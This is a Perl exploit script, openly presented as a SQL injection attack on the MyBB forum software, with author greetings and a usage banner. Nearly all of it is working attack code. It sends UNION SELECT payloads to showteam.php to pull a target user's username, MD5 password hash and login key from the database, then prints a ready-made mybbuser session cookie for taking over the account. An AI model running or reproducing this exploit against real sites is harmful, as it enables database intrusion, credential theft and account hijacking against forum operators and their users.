#!/bin/env perl
#//-------------------------------------------------------------#
#//     MyBB Forum SQL Injection Exploit .. By HACKERS PAL      #
#//     Greets For Devil-00 - Abducter - Almaster - GaCkeR      #
#//   Special Greets For SG (SecurityGurus) Team And Members    #
#//                    http://WwW.SoQoR.NeT                     #
#//-------------------------------------------------------------#

use LWP::Simple;
print "\n#####################################################";
print "\n#        MyBB Forum Exploit By : HACKERS PAL        #";
print "\n#               Http://WwW.SoQoR.NeT                #";
if(!$ARGV[0] or !$ARGV[1]) {
print "\n# -- Usage:                                         #";
print "\n# -- perl $0 [Full-Path] [User ID]             #";
print "\n# -- Example:                                       #";
print "\n# -- perl $0 http://mods.mybboard.com/forum/ 1 #";
print "\n#     Greets To Devil-00 - Abducter - GaCkeR        #";
print "\n#####################################################";
    exit(0);
}
else
{
print "\n#     Greets To Devil-00 - Abducter - GaCkeR        #";
print "\n#####################################################";
        $web=$ARGV[0];
        $id=$ARGV[1];
$url = "showteam.php?GLOBALS[]=1&comma=/*";
            $site="$web/$url";
$page = get($site) || die "[-] Unable to retrieve: $!";
$page =~ m/FROM (.*)users u WHERE/;
 $prefix=$1;
if(!$1)
       {
$prefix="mybb_";
       }
$url =
"showteam.php?GLOBALS[]=1&comma=-2)%20union%20select%20uid,username,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,nul
l,null,null,null,null,null,null,null,null,null,1,4%20from%20".$prefix."users%20where%20uid=$id/*";
            $site="$web/$url";
$page = get($site) || die "[-] Unable to retrieve: $!";
print "\n[+] Connected to: $ARGV[0]\n";
print "[+] User ID is : $id ";
print "\n[+] Table Prefix is : $prefix";
$page =~ m/<b><i>(.*)<\/i><\/b>/ && print "\n[+] User Name : $1";
print "\n[-] Unable to retrieve User Name\n" if(!$1);
$url =
"showteam.php?GLOBALS[]=1&comma=-2)%20union%20select%20uid,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,nul
l,null,null,null,null,null,null,null,null,null,1,4%20from%20".$prefix."users%20where%20uid=$id/*";
            $site="$web/$url";
$page = get($site) || die "[-] Unable to retrieve: $!";
$page =~ m/<b><i>(.*)<\/i><\/b>/ && print "\n[+] Md5 Hash of Password : $1\n";
die("\n[-] Unable to retrieve The Hash of password\n") if(!$1);
   print"\n[!] Watch out ... The Cookie Value is comming\n";
$url =
"showteam.php?GLOBALS[]=1&comma=-2)%20union%20select%20uid,loginkey,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,nul
l,null,null,null,null,null,null,null,null,null,1,4%20from%20".$prefix."users%20where%20uid=$id/*";
            $site="$web/$url";
$page = get($site) || die "[-] Unable to retrieve: $!";
$page =~ m/<b><i>(.*)<\/i><\/b>/ && print "[+] Cookie [mybbuser] Value:-\n[*] $id"."_"."$1\n";
print "[-] Unable to retrieve Login Key\n" if(!$1);
}
